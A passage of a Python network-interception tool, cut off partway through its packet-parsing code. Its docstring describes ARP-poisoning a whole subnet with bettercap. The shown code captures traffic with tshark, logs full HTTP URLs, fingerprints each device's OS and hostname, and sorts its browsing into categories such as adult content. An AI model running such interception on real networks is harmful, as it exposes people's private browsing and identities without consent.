#!/usr/bin/env python3
"""
MITC - v3: suma fuentes activas de identificación de hostname
(User-Agent HTTP/SSDP, cabecera Server, NBNS, LLMNR) y una GUI con tema
oscuro + grafo de topología de red en Canvas.

NUEVO EN ESTA VERSIÓN respecto a la v2:
  - Hostname/SO por evidencia directa del propio dispositivo, nivel "alta
    confianza" (por encima incluso de DHCP, porque es lo más explícito que
    existe):
      * User-Agent en HTTP plano: "Dalvik/2.1.0 (Linux; ... Android 13)",
        "CPU iPhone OS 17_4 ...", "Windows NT 10.0", etc.
      * Cabecera "Server" de HTTP/SSDP (SSDP comparte el parser de
        cabeceras HTTP): "Linux/... UPnP/1.0", "Android/9 UPnP/1.0", etc.
      * NBNS (NetBIOS Name Service, puerto 137): nombre de máquina Windows
        anunciado por el propio dispositivo (solo se toma si es un mensaje
        de registro/respuesta, no una consulta sobre OTRO host).
      * LLMNR (puerto 5355): reutiliza el mismo parser de DNS que ya
        usábamos; se toma el nombre cuando viene en una RESPUESTA (quien
        responde es, por definición, el dueño de ese nombre).
  - Antes de lanzar tshark, se valida contra `tshark -G fields` cuáles de
    los campos "opcionales" (NBNS, DHCP, ARP, User-Agent, etc.) existen en
    tu versión instalada. Si falta alguno, se desactiva esa señal puntual
    con un aviso, en vez de que tshark se niegue a arrancar.
  - GUI con tema oscuro y un grafo de topología (gateway al centro,
    dispositivos alrededor, grosor de línea = volumen de tráfico, color =
    familia de SO inferida) en una pestaña nueva junto al feed en vivo.

REQUIERE: bettercap y tshark instalados y en PATH. Correr como root/sudo.
Tkinter: en Arch/Manjaro -> sudo pacman -S tk ; en Debian/Ubuntu ->
sudo apt install python3-tk

ADVERTENCIA DE ALCANCE: esto envenena ARP en TODA la subred indicada.
Úsalo únicamente dentro de tu red de laboratorio/propia, o un engagement
con autorización explícita por escrito que cubra ARP spoofing de subred
completa. Fuera de ese alcance es ilegal en la gran mayoría de
jurisdicciones, incluso si "solo estás mirando".

Uso:
    sudo python3 mitc.py -i wlo1
    sudo python3 mitc.py -i eth0 --subnet 192.168.0.0/24
    sudo python3 mitc.py -i eth0 --skip-arp-spoof
    sudo python3 mitc.py -i eth0 --oui-file ieee_oui.csv
"""

import argparse
import csv
import ipaddress
import json
import math
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import tkinter as tk
import urllib.request
from collections import defaultdict, deque, Counter
from datetime import datetime
from tkinter import ttk, simpledialog, messagebox, filedialog

# ===========================================================================
# PARTE 1: Catálogo de clasificación de dominios (servicio/app por dominio)
# ===========================================================================

SIGNATURES = {
    "Streaming música": [
        (r"spotify\.com|spotifycdn\.com|scdn\.co", "Spotify"),
        (r"deezer\.com", "Deezer"),
        (r"soundcloud\.com|sndcdn\.com", "SoundCloud"),
        (r"music\.apple\.com", "Apple Music"),
        (r"tidal\.com", "Tidal"),
    ],
    "Streaming video": [
        (r"(^|\.)youtube\.com|ytimg\.com|googlevideo\.com|youtu\.be", "YouTube"),
        (r"netflix\.com|nflxvideo\.net|nflximg", "Netflix"),
        (r"primevideo\.com|aiv-cdn\.net", "Prime Video"),
        (r"disneyplus\.com|bamgrid\.com", "Disney+"),
        (r"twitch\.tv|ttvnw\.net", "Twitch"),
        (r"hbomax\.com|max\.com", "HBO Max"),
        (r"vimeo\.com", "Vimeo"),
    ],
    "Redes sociales": [
        (r"instagram\.com|cdninstagram\.com", "Instagram"),
        (r"(^|\.)facebook\.com|fbcdn\.net", "Facebook"),
        (r"(^|\.)twitter\.com|(^|\.)x\.com|twimg\.com", "X (Twitter)"),
        (r"tiktok\.com|tiktokcdn|byteoversea", "TikTok"),
        (r"linkedin\.com|licdn\.com", "LinkedIn"),
        (r"snapchat\.com|sc-cdn\.net", "Snapchat"),
        (r"pinterest\.com", "Pinterest"),
        (r"reddit\.com|redditmedia\.com|redd\.it", "Reddit"),
    ],
    "Mensajería": [
        (r"whatsapp\.com|whatsapp\.net", "WhatsApp"),
        (r"telegram\.org|t\.me", "Telegram"),
        (r"messenger\.com", "Messenger"),
        (r"discord\.com|discordapp\.com|discord\.media", "Discord"),
        (r"signal\.org", "Signal"),
    ],
    "Nube": [
        (r"dropbox\.com", "Dropbox"),
        (r"drive\.google\.com|docs\.google\.com", "Google Drive"),
        (r"onedrive\.live\.com|1drv\.ms", "OneDrive"),
        (r"icloud\.com", "iCloud"),
    ],
    "Gaming": [
        (r"steampowered\.com|steamcontent\.com|steamcommunity\.com", "Steam"),
        (r"epicgames\.com", "Epic Games"),
        (r"xboxlive\.com|xbox\.com", "Xbox Live"),
        (r"playstation\.net", "PlayStation"),
        (r"riotgames\.com|leagueoflegends\.com", "Riot/LoL"),
        (r"roblox\.com", "Roblox"),
        (r"minecraft\.net|mojang\.com", "Minecraft"),
    ],
    "Compras": [
        (r"amazon\.(com|com\.mx|es)", "Amazon"),
        (r"mercadolibre\.com|mercadolivre\.com", "MercadoLibre"),
        (r"ebay\.com", "eBay"),
        (r"aliexpress\.com", "AliExpress"),
    ],
    "Correo": [
        (r"gmail\.com|mail\.google\.com", "Gmail"),
        (r"outlook\.com|outlook\.office", "Outlook"),
    ],
    "Mapas/transporte": [
        (r"maps\.google\.com|maps\.googleapis", "Google Maps"),
        (r"waze\.com", "Waze"),
        (r"uber\.com", "Uber"),
    ],
    "Ecosistema/SO": [
        (r"windowsupdate\.com|microsoft\.com|msftconnecttest", "Microsoft"),
        (r"apple\.com|mzstatic\.com", "Apple"),
        (r"xiaomi\.net|xiaomi\.com|miui\.com", "Xiaomi"),
        (r"mediatek\.com", "MediaTek"),
        (r"ubuntu\.com|debian\.org|manjaro\.org|archlinux\.org", "Linux"),
    ],
    "Publicidad/tracking": [
        (r"doubleclick\.net|googlesyndication\.com|adservice\.google", "Google Ads"),
        (r"connect\.facebook\.net", "Facebook Pixel"),
        (r"google-analytics\.com|analytics\.google", "Google Analytics"),
        (r"fastly-insights\.com", "Fastly RUM (monitoreo de rendimiento)"),
    ],
    "Contenido adulto": [
        (r"pornhub\.com|phncdn\.com", "PornHub"),
        (r"xvideos\.com|xvideos-cdn\.com", "XVideos"),
        (r"xnxx\.com", "XNXX"),
        (r"xhamster\.com", "xHamster"),
        (r"onlyfans\.com", "OnlyFans"),
        (r"redtube\.com|youporn\.com|tube8\.com", "RedTube/YouPorn/Tube8 (MindGeek)"),
    ],
    "Google (general/infraestructura)": [
        (r"^google\.(com|com\.mx|es|co\.uk|[a-z.]+)$|(^|\.)www\.google\.", "Google Search"),
        (r"accounts\.google\.com", "Cuenta de Google (login)"),
        (r"gstatic\.com|fonts\.gstatic\.com", "Google - recursos estáticos (gstatic)"),
        (r"googleusercontent\.com", "Google - contenido de usuario"),
        (r"gvt1\.com|gvt2\.com|gvt3\.com", "Google - actualizaciones/Play"),
        (r"clients\d?\.google\.com", "Google - servicios cliente"),
    ],
    "Cumplimiento / cookies": [
        (r"onetrust\.com|cookielaw\.org", "OneTrust (banner de cookies)"),
        (r"trustarc\.com", "TrustArc (banner de cookies)"),
        (r"cookiebot\.com", "Cookiebot (banner de cookies)"),
    ],
}

FLAT_SIGNATURES = [
    (re.compile(pattern, re.I), cat, service)
    for cat, items in SIGNATURES.items()
    for pattern, service in items
]

GENERIC_FALLBACK = [
    (re.compile(r"\.fastly\.net$|fastly\.net$", re.I), "Infraestructura", "Fastly (CDN)"),
    (re.compile(r"akamai(ized|edge)?\.net$|akamai\.com$", re.I), "Infraestructura", "Akamai (CDN)"),
    (re.compile(r"cloudfront\.net$", re.I), "Infraestructura", "Amazon CloudFront (CDN)"),
    (re.compile(r"cloudflare\.(com|net)$|cdn-cgi", re.I), "Infraestructura", "Cloudflare (CDN)"),
    (re.compile(r"edgekey\.net$|edgesuite\.net$", re.I), "Infraestructura", "Akamai Edge (CDN)"),
    (re.compile(r"azureedge\.net$|azure\.com$|windows\.net$", re.I), "Infraestructura", "Microsoft Azure"),
    (re.compile(r"amazonaws\.com$", re.I), "Infraestructura", "Amazon AWS"),
    (re.compile(r"googlevideo\.com$", re.I), "Streaming video", "YouTube (CDN de video)"),
    (re.compile(r"googleapis\.com$", re.I), "Infraestructura", "Google API (genérico)"),
    (re.compile(r"mtalk\.google\.com$", re.I), "Infraestructura", "Google push (FCM)"),
    (re.compile(r"aliyuncs\.com$|aliyuncsslbintl\.com$", re.I), "Infraestructura", "Alibaba Cloud"),
]


def is_private(ip):
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def match_generic(domain):
    for regex, cat, label in GENERIC_FALLBACK:
        if regex.search(domain):
            return cat, label
    return None, None


def match_service(domain):
    """Devuelve (categoria, servicio, es_generico)."""
    for regex, cat, service in FLAT_SIGNATURES:
        if regex.search(domain):
            return cat, service, False
    cat, label = match_generic(domain)
    if cat:
        return cat, label, True
    return None, None, False


def enrich_domain(domain, timeout=2.5):
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror:
        return None
    try:
        req = urllib.request.Request(
            f"https://ipapi.co/{ip}/json/",
            headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read().decode())
        org = data.get("org") or data.get("asn")
        country = data.get("country_name")
        if org:
            return f"{org}" + (f", {country}" if country else "")
    except Exception:
        return None
    return None


# ===========================================================================
# PARTE 1.5: Inferencia pasiva de sistema operativo / identificación
# ===========================================================================

# -- Nivel "alta confianza" #1: el dispositivo lo dice de sí mismo en texto
#    plano (User-Agent HTTP, cabecera Server de HTTP/SSDP) --

USER_AGENT_HINTS = [
    (re.compile(r"iphone", re.I), "iOS (iPhone)"),
    (re.compile(r"ipad", re.I), "iPadOS (iPad)"),
    (re.compile(r"macintosh", re.I), "macOS"),
    (re.compile(r"android", re.I), "Android"),
    (re.compile(r"cros", re.I), "ChromeOS"),
    (re.compile(r"windows nt 10\.0", re.I), "Windows 10/11"),
    (re.compile(r"windows nt 6\.3", re.I), "Windows 8.1"),
    (re.compile(r"windows nt", re.I), "Windows (versión no identificada)"),
    (re.compile(r"x11;\s*linux", re.I), "Linux (escritorio)"),
    (re.compile(r"tizen", re.I), "Tizen (Samsung)"),
]

SERVER_HEADER_HINTS = [
    (re.compile(r"android", re.I), "Android (SSDP/UPnP)"),
    (re.compile(r"darwin|mac os", re.I), "macOS/iOS (SSDP/UPnP)"),
    (re.compile(r"windows", re.I), "Windows (SSDP/UPnP)"),
    (re.compile(r"lwip|freertos", re.I), "Firmware IoT (lwIP/FreeRTOS)"),
    (re.compile(r"linux", re.I), "Linux/embebido (SSDP/UPnP)"),
]


def check_user_agent_hints(ua):
    for regex, label in USER_AGENT_HINTS:
        if regex.search(ua):
            return label
    return None


def check_server_header_hints(server_hdr):
    for regex, label in SERVER_HEADER_HINTS:
        if regex.search(server_hdr):
            return label
    return None


# -- Nivel "alta confianza" #2: lo que el dispositivo declaró por DHCP --

DHCP_VENDOR_CLASS_HINTS = [
    (re.compile(r"android", re.I), "Android"),
    (re.compile(r"^msft", re.I), "Windows"),
    (re.compile(r"dhcpcd", re.I), "Linux (cliente dhcpcd)"),
    (re.compile(r"udhcp", re.I), "Linux/embebido (udhcpc)"),
    (re.compile(r"apple", re.I), "iOS/macOS (Apple)"),
]

# -- Hostnames, de cualquier fuente (DHCP, mDNS, NBNS, LLMNR) --

HOSTNAME_HINTS = [
    (re.compile(r"^iphone", re.I), "iOS (iPhone)"),
    (re.compile(r"^ipad", re.I), "iPadOS (iPad)"),
    (re.compile(r"macbook|imac|mac-?mini|mac-?pro", re.I), "macOS"),
    (re.compile(r"^android[-_]", re.I), "Android"),
    (re.compile(r"^desktop-|^laptop-", re.I), "Windows"),
    (re.compile(r"-pc$", re.I), "Windows (probable)"),
    (re.compile(r"^raspberrypi", re.I), "Linux (Raspberry Pi)"),
    (re.compile(r"^manjaro", re.I), "Manjaro Linux"),
    (re.compile(r"^arch(linux)?$", re.I), "Arch Linux"),
    (re.compile(r"^ubuntu", re.I), "Ubuntu Linux"),
    (re.compile(r"^debian", re.I), "Debian Linux"),
    (re.compile(r"^fedora", re.I), "Fedora Linux"),
]

# -- Nivel "media confianza": dominios de "connectivity check" muy
#    específicos de cada SO --

OS_DOMAIN_HINTS_STRONG = [
    (re.compile(r"captive\.apple\.com|gsp-ssl\.ls\.apple\.com", re.I), "iOS/macOS (Apple)"),
    (re.compile(r"connectivitycheck\.gstatic\.com|clients3\.google\.com", re.I), "Android"),
    (re.compile(r"msftconnecttest\.com|msftncsi\.com", re.I), "Windows"),
    (re.compile(r"connectivity-check\.ubuntu\.com", re.I), "Ubuntu Linux"),
    (re.compile(r"network-test\.debian\.(org|net)", re.I), "Debian Linux"),
]

# -- Nivel "baja confianza": catálogo general de dominios de marca --

OS_DOMAIN_HINTS_WEAK = [
    (re.compile(r"xiaomi\.(com|net|cn)|miui\.com", re.I), "Android (Xiaomi/MIUI)"),
    (re.compile(r"hicloud\.com|vmall\.com|huawei\.com", re.I), "Android/HarmonyOS (Huawei)"),
    (re.compile(r"icloud\.com|apple\.com|mzstatic\.com", re.I), "iOS/macOS (Apple)"),
    (re.compile(r"manjaro\.org", re.I), "Manjaro Linux"),
    (re.compile(r"archlinux\.org", re.I), "Arch Linux"),
    (re.compile(r"debian\.org", re.I), "Debian Linux"),
    (re.compile(r"ubuntu\.com", re.I), "Ubuntu Linux"),
    (re.compile(r"samsung\.com|samsungosp\.com", re.I), "Android (Samsung)"),
    (re.compile(r"oppo\.com|coloros\.com", re.I), "Android (Oppo/ColorOS)"),
]

MDNS_HOSTNAME_RE = re.compile(r"^([A-Za-z0-9][A-Za-z0-9\-]*)\.local$")

# -- MAC -> fabricante. Tabla A PROPÓSITO chica/ilustrativa (~20 entradas
#    muy conocidas). NO la tomes como fuente de verdad para tu reporte.
#    Para cobertura real: https://standards-oui.ieee.org/oui/oui.csv y
#    pásalo con --oui-file; el loader soporta ese CSV completo. --
MAC_OUI_DB = {
    "B827EB": "Raspberry Pi Foundation",
    "DCA632": "Raspberry Pi Trading Ltd",
    "E45F01": "Raspberry Pi Trading Ltd",
    "240AC4": "Espressif Inc. (ESP32/ESP8266)",
    "3C71BF": "Espressif Inc. (ESP32/ESP8266)",
    "EC94CB": "Espressif Inc. (ESP32/ESP8266)",
    "F0039F": "Apple, Inc.",
    "AC87A3": "Apple, Inc.",
    "D0817A": "Apple, Inc.",
    "F4F15A": "Google, Inc.",
    "F4F5D8": "Google, Inc.",
    "3C5AB4": "Google, Inc.",
    "A0CE78": "Samsung Electronics Co.,Ltd",
    "5C0A5B": "Samsung Electronics Co.,Ltd",
    "C0EEFB": "Xiaomi Communications Co Ltd",
    "64B473": "Xiaomi Communications Co Ltd",
    "B07994": "Huawei Technologies Co.,Ltd",
    "54A51B": "Huawei Technologies Co.,Ltd",
    "0050F2": "Microsoft Corp.",
    "B0A7B9": "D-Link International",
}

OUI_VENDOR_OS_FAMILY = [
    (re.compile(r"apple", re.I), "iOS/macOS (familia Apple)"),
    (re.compile(r"raspberry pi", re.I), "Linux (Raspberry Pi)"),
    (re.compile(r"espressif", re.I), "Firmware IoT (ESP32/ESP8266 — no es un SO de propósito general)"),
    (re.compile(r"xiaomi", re.I), "Android (Xiaomi)"),
    (re.compile(r"samsung", re.I), "Android o Tizen (Samsung)"),
    (re.compile(r"huawei", re.I), "Android/HarmonyOS (Huawei)"),
    (re.compile(r"^google", re.I), "Android/ChromeOS (Google)"),
    (re.compile(r"amazon technologies", re.I), "Fire OS / Linux (Amazon)"),
    (re.compile(r"microsoft", re.I), "Windows (o Xbox)"),
    (re.compile(r"intel corp", re.I), "PC con NIC Intel (SO indeterminado)"),
    (re.compile(r"dell|hewlett packard|lenovo|asustek|compal|quanta", re.I),
     "PC portátil/escritorio (SO indeterminado)"),
    (re.compile(r"tp-link|ubiquiti|cisco|mikrotik|netgear|d-link", re.I),
     "Infraestructura de red (router/AP, no es un dispositivo de usuario)"),
]


def normalize_mac(raw_mac):
    if not raw_mac:
        return None
    mac = raw_mac.strip().upper().replace("-", ":").split(",")[0]
    if re.match(r"^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
        return mac
    return None


def lookup_oui(mac_key, oui_db):
    if not mac_key or mac_key.startswith("ip:"):
        return None
    oui = mac_key.replace(":", "")[:6]
    return oui_db.get(oui)


def load_oui_file(path):
    db = {}
    try:
        with open(path, newline="", encoding="utf-8", errors="ignore") as f:
            sample = f.read(2048)
            f.seek(0)
            if "Assignment" in sample and "Organization" in sample:
                reader = csv.DictReader(f)
                for row in reader:
                    oui = (row.get("Assignment") or "").strip().upper()
                    org = (row.get("Organization Name") or "").strip()
                    if len(oui) == 6 and org:
                        db[oui] = org
            else:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = re.split(r"[,\t]", line, maxsplit=1)
                    if len(parts) == 2:
                        oui = re.sub(r"[^0-9A-Fa-f]", "", parts[0]).upper()[:6]
                        if len(oui) == 6:
                            db[oui] = parts[1].strip()
    except Exception as e:
        print(f"[!] No pude cargar --oui-file ({path}): {e}")
    return db


def check_hostname_hints(hostname):
    for regex, label in HOSTNAME_HINTS:
        if regex.search(hostname):
            return label
    return None


def check_vendor_class_hints(vendor_class):
    for regex, label in DHCP_VENDOR_CLASS_HINTS:
        if regex.search(vendor_class):
            return label
    return None


# ===========================================================================
# PARTE 1.6: campos de tshark, con validación de disponibilidad
# ===========================================================================

# (nombre_de_campo, "core"|"optional"). "core" siempre se incluye (y si
# falta, tronamos con un mensaje claro); "optional" se valida contra
# `tshark -G fields` y se deja fuera en silencio (con aviso) si no existe
# en la versión de tshark instalada, para no tronar la captura completa
# por un solo campo no soportado (ej. NBNS en builds minimalistas).
ALL_FIELDS = [
    ("ip.src", "core"),
    ("frame.time_epoch", "core"),
    ("eth.src", "optional"),
    ("dns.flags.response", "optional"),
    ("dns.qry.name", "optional"),
    ("tls.handshake.type", "optional"),
    ("tls.handshake.extensions_server_name", "optional"),
    ("http.host", "optional"),
    ("http.request.full_uri", "optional"),
    ("http.user_agent", "optional"),
    ("http.server", "optional"),
    ("bootp.hw.mac_addr", "optional"),
    ("bootp.option.hostname", "optional"),
    ("bootp.option.vendor_class_id", "optional"),
    ("bootp.ip.your", "optional"),
    ("bootp.ip.client", "optional"),
    ("arp.src.hw_mac", "optional"),
    ("arp.src.proto_ipv4", "optional"),
    ("nbns.name", "optional"),
    ("nbns.flags.response", "optional"),
]


def probe_available_tshark_fields():
    """Corre `tshark -G fields` y devuelve el set de abreviaturas de campo
    disponibles, o None si no se pudo determinar (en cuyo caso se asume
    que todos los campos existen, comportamiento optimista de respaldo)."""
    try:
        out = subprocess.run(["tshark", "-G", "fields"],
                              capture_output=True, text=True, timeout=15).stdout
    except Exception:
        return None
    names = set()
    for line in out.splitlines():
        cols = line.split("\t")
        if len(cols) > 2 and cols[0] == "F":
            names.add(cols[2])
    return names or None


def resolve_active_fields():
    available = probe_available_tshark_fields()
    active, dropped = [], []
    for name, kind in ALL_FIELDS:
        if kind == "core" or available is None or name in available:
            active.append(name)
        else:
            dropped.append(name)
    if dropped:
        print("[!] Tu tshark no tiene estos campos opcionales; se desactivan "
              f"las señales asociadas: {', '.join(dropped)}")
    return active


# ===========================================================================
# PARTE 2: Almacén de actividad por dispositivo (MAC como llave primaria)
# ===========================================================================

class ActivityStore:
    def __init__(self, private_only=True, feed_size=500, aliases_path=None,
                 oui_file=None, active_fields=None):
        self.private_only = private_only
        self.devices = {}
        self.ip_to_mac = {}
        self.feed = deque(maxlen=feed_size)
        self.lock = threading.Lock()

        self.active_fields = active_fields or [name for name, _ in ALL_FIELDS]

        self.aliases_path = aliases_path
        self.aliases = {}
        if aliases_path and os.path.exists(aliases_path):
            try:
                with open(aliases_path, "r", encoding="utf-8") as f:
                    self.aliases = json.load(f)
            except Exception:
                self.aliases = {}

        self.oui_db = dict(MAC_OUI_DB)
        if oui_file:
            self.oui_db.update(load_oui_file(oui_file))

    # ---- estructura de un dispositivo nuevo ---------------------------
    def _new_device(self, mac_key):
        return {
            "mac": mac_key,
            "ips": set(),
            "current_ip": None,
            "first_seen": None,
            "last_seen": None,
            "vendor_oui": None,
            "hostname": None,
            "hostname_source": None,
            "dhcp_vendor_class": None,
            "os_guess": None,
            "os_confidence": None,
            "os_signals": [],
            "change_log": [],
            "activity": defaultdict(lambda: {"hits": 0, "first": None, "last": None}),
            "unmatched_domains": Counter(),
            "http_urls": [],
            "seen_domains": set(),
        }

    def _get_device(self, mac_key):
        if mac_key not in self.devices:
            self.devices[mac_key] = self._new_device(mac_key)
        return self.devices[mac_key]

    def _to_float(self, s):
        try:
            return float(s)
        except (TypeError, ValueError):
            return time.time()

    # ---- bitácora de cambios / señales de SO --------------------------
    def _log_change(self, device, change_type, detail, ts):
        device["change_log"].append({"ts": ts, "type": change_type, "detail": detail})
        if len(device["change_log"]) > 200:
            device["change_log"] = device["change_log"][-200:]

    def _add_signal(self, device, tier, label, text):
        for sig in device["os_signals"]:
            if sig["text"] == text:
                return
        device["os_signals"].append({"tier": tier, "label": label, "text": text})

    def _recompute_os(self, device):
        tier_priority = ["user_agent", "dhcp_vendor", "hostname", "domain_strong", "oui", "domain_weak"]
        tier_conf = {"user_agent": "alta", "dhcp_vendor": "alta", "hostname": "alta",
                     "domain_strong": "media", "oui": "media", "domain_weak": "baja"}
        by_tier = {}
        for sig in device["os_signals"]:
            by_tier.setdefault(sig["tier"], sig["label"])
        for t in tier_priority:
            if t in by_tier:
                device["os_guess"] = by_tier[t]
                device["os_confidence"] = tier_conf[t]
                return
        device["os_guess"] = None
        device["os_confidence"] = None

    def _set_ip(self, device, new_ip, ts):
        if not new_ip or new_ip == "0.0.0.0":
            return
        old_ip = device["current_ip"]
        if new_ip != old_ip:
            if old_ip:
                self._log_change(device, "cambio_ip", f"{old_ip} → {new_ip}", ts)
            device["current_ip"] = new_ip
        device["ips"].add(new_ip)
        self.ip_to_mac[new_ip] = device["mac"]

    def _set_hostname_field(self, device, new_value, ts, source_label):
        if not new_value:
            return
        new_value = new_value.strip()
        if not new_value:
            return
        old = device["hostname"]
        if new_value == old:
            return
        if old:
            self._log_change(device, "cambio_hostname", f"[{source_label}] '{old}' → '{new_value}'", ts)
        else:
            self._log_change(device, "hostname_detectado", f"[{source_label}] '{new_value}'", ts)
        device["hostname"] = new_value
        device["hostname_source"] = source_label
        label = check_hostname_hints(new_value)
        if label:
            text = f"[{source_label}] hostname «{new_value}» → {label}"
            self._add_signal(device, "hostname", label, text)

    def _maybe_add_oui_signal(self, device):
        if not device["vendor_oui"]:
            return
        for regex, label in OUI_VENDOR_OS_FAMILY:
            if regex.search(device["vendor_oui"]):
                text = f"[MAC] fabricante «{device['vendor_oui']}» → {label}"
                self._add_signal(device, "oui", label, text)
                return

    def _merge_device(self, dst, src, ts):
        for key, v in src["activity"].items():
            entry = dst["activity"][key]
            entry["hits"] += v["hits"]
            firsts = [x for x in (entry["first"], v["first"]) if x is not None]
            lasts = [x for x in (entry["last"], v["last"]) if x is not None]
            entry["first"] = min(firsts) if firsts else None
            entry["last"] = max(lasts) if lasts else None
        dst["unmatched_domains"].update(src["unmatched_domains"])
        dst["http_urls"].extend(src["http_urls"])
        dst["seen_domains"] |= src["seen_domains"]
        dst["ips"] |= src["ips"]
        for sig in src["os_signals"]:
            self._add_signal(dst, sig["tier"], sig["label"], sig["text"])
        if not dst["hostname"] and src["hostname"]:
            dst["hostname"] = src["hostname"]
            dst["hostname_source"] = src["hostname_source"]
        if not dst["dhcp_vendor_class"] and src["dhcp_vendor_class"]:
            dst["dhcp_vendor_class"] = src["dhcp_vendor_class"]
        self._log_change(dst, "fusion",
                          f"unificado con registro temporal de {src.get('current_ip') or src['mac']}", ts)
        if src["mac"] in self.aliases and dst["mac"] not in self.aliases:
            self.aliases[dst["mac"]] = self.aliases.pop(src["mac"])
            self._save_aliases()

    # ---- ingestión principal -------------------------------------------
    def observe(self, ip, mac, ts):
        with self.lock:
            mac_norm = normalize_mac(mac)
            mac_key = mac_norm or self.ip_to_mac.get(ip) or f"ip:{ip}"
            device = self._get_device(mac_key)
            if device["first_seen"] is None:
                device["first_seen"] = ts
            device["last_seen"] = ts
            if ip:
                self._set_ip(device, ip, ts)
            if mac_norm and device["vendor_oui"] is None:
                device["vendor_oui"] = lookup_oui(mac_key, self.oui_db)
                self._maybe_add_oui_signal(device)
                self._recompute_os(device)
            return mac_key

    def handle_dhcp(self, mac, hostname, vendor_class, yiaddr, ciaddr, ts):
        mac_key = normalize_mac(mac)
        if not mac_key:
            return
        with self.lock:
            device = self._get_device(mac_key)
            if device["first_seen"] is None:
                device["first_seen"] = ts
            device["last_seen"] = ts
            if device["vendor_oui"] is None:
                device["vendor_oui"] = lookup_oui(mac_key, self.oui_db)
                self._maybe_add_oui_signal(device)

            assigned_ip = None
            for candidate in (yiaddr, ciaddr):
                if candidate and candidate != "0.0.0.0":
                    assigned_ip = candidate
                    break
            if assigned_ip and (not self.private_only or is_private(assigned_ip)):
                placeholder = self.devices.get(f"ip:{assigned_ip}")
                if placeholder is not None and placeholder is not device:
                    self._merge_device(device, placeholder, ts)
                    del self.devices[f"ip:{assigned_ip}"]
                self._set_ip(device, assigned_ip, ts)

            if vendor_class:
                old = device["dhcp_vendor_class"]
                if vendor_class != old:
                    if old:
                        self._log_change(device, "dhcp_vendor_class", f"'{old}' → '{vendor_class}'", ts)
                    device["dhcp_vendor_class"] = vendor_class
                    label = check_vendor_class_hints(vendor_class)
                    if label:
                        text = f"[DHCP] vendor class «{vendor_class}» → {label}"
                        self._add_signal(device, "dhcp_vendor", label, text)

            if hostname:
                self._set_hostname_field(device, hostname, ts, "DHCP")

            self._recompute_os(device)

    def handle_nbns_self_announce(self, ip, eth_src, name, ts):
        """NBNS con flag de respuesta/registro: quien lo manda está
        anunciando SU PROPIO nombre NetBIOS (a diferencia de una consulta,
        donde el nombre es el de OTRO host que se busca)."""
        if self.private_only and not is_private(ip):
            return
        mac_key = self.observe(ip, eth_src, ts)
        with self.lock:
            device = self._get_device(mac_key)
            self._set_hostname_field(device, name, ts, "NBNS")
            self._recompute_os(device)

    def handle_llmnr_response(self, mac_key, name, ts):
        """LLMNR (reutiliza el formato DNS): si viene en una respuesta, el
        que respondió es el dueño de ese nombre."""
        with self.lock:
            device = self._get_device(mac_key)
            self._set_hostname_field(device, name, ts, "LLMNR")
            self._recompute_os(device)

    def handle_identity_headers(self, mac_key, user_agent, server_hdr):
        if not user_agent and not server_hdr:
            return
        with self.lock:
            device = self._get_device(mac_key)
            if user_agent:
                label = check_user_agent_hints(user_agent)
                if label:
                    text = f"[User-Agent] «{user_agent[:70]}» → {label}"
                    self._add_signal(device, "user_agent", label, text)
            if server_hdr:
                label = check_server_header_hints(server_hdr)
                if label:
                    text = f"[Cabecera Server] «{server_hdr[:70]}» → {label}"
                    self._add_signal(device, "user_agent", label, text)
            self._recompute_os(device)

    def ingest_domain(self, mac_key, ip, domain, ts):
        if not domain:
            return
        with self.lock:
            device = self._get_device(mac_key)
            is_new = domain not in device["seen_domains"]
            device["seen_domains"].add(domain)

            cat, service, is_generic = match_service(domain)
            device["last_seen"] = ts

            if cat:
                key = f"{cat}|{service}"
                entry = device["activity"][key]
                entry["hits"] += 1
                if entry["first"] is None:
                    entry["first"] = ts
                entry["last"] = ts
                label = f"CDN:{service}" if is_generic else service
            else:
                device["unmatched_domains"][domain] += 1
                label = None

            for regex, os_label in OS_DOMAIN_HINTS_STRONG:
                if regex.search(domain):
                    text = f"[Dominio] {domain} → {os_label}"
                    self._add_signal(device, "domain_strong", os_label, text)
                    break
            else:
                for regex, os_label in OS_DOMAIN_HINTS_WEAK:
                    if regex.search(domain):
                        text = f"[Dominio] {domain} → {os_label}"
                        self._add_signal(device, "domain_weak", os_label, text)
                        break

            m = MDNS_HOSTNAME_RE.match(domain)
            if m:
                self._set_hostname_field(device, m.group(1), ts, "mDNS")

            if is_new:
                self.feed.append((ts, mac_key, ip, domain, label))

            self._recompute_os(device)

    def parse_line(self, parts):
        af = self.active_fields
        if len(parts) < len(af):
            parts = parts + [""] * (len(af) - len(parts))
        row = dict(zip(af, parts))

        ip = row.get("ip.src", "")
        ts = self._to_float(row.get("frame.time_epoch", ""))
        eth_src = row.get("eth.src", "")

        dhcp_mac = row.get("bootp.hw.mac_addr", "")
        if dhcp_mac:
            self.handle_dhcp(dhcp_mac, row.get("bootp.option.hostname", ""),
                              row.get("bootp.option.vendor_class_id", ""),
                              row.get("bootp.ip.your", ""), row.get("bootp.ip.client", ""), ts)
            return

        arp_mac = row.get("arp.src.hw_mac", "")
        arp_ip = row.get("arp.src.proto_ipv4", "")
        if arp_mac and arp_ip:
            if self.private_only and not is_private(arp_ip):
                return
            self.observe(arp_ip, arp_mac, ts)
            return

        nbns_name = row.get("nbns.name", "")
        nbns_resp = row.get("nbns.flags.response", "")
        if nbns_name and nbns_resp == "1" and ip:
            self.handle_nbns_self_announce(ip, eth_src, nbns_name, ts)
            return

        if not ip or "," in ip:
            return
        if self.private_only and not is_private(ip):
            return

        mac_key = self.observe(ip, eth_src, ts)

        user_agent = row.get("http.user_agent", "")
        server_hdr = row.get("http.server", "")
        if user_agent or server_hdr:
            self.handle_identity_headers(mac_key, user_agent, server_hdr)

        full_uri = row.get("http.request.full_uri", "")
        if full_uri:
            with self.lock:
                device = self._get_device(mac_key)
                device["http_urls"].append((ts, full_uri))
                device["last_seen"] = ts
                self.feed.append((ts, mac_key, ip, full_uri, "HTTP URL completa"))

        dns_qry = row.get("dns.qry.name", "")
        dns_resp = row.get("dns.flags.response", "")
        tls_type = row.get("tls.handshake.type", "")
        sni = row.get("tls.handshake.extensions_server_name", "")
        host = row.get("http.host", "")

        if dns_qry and dns_resp == "0":
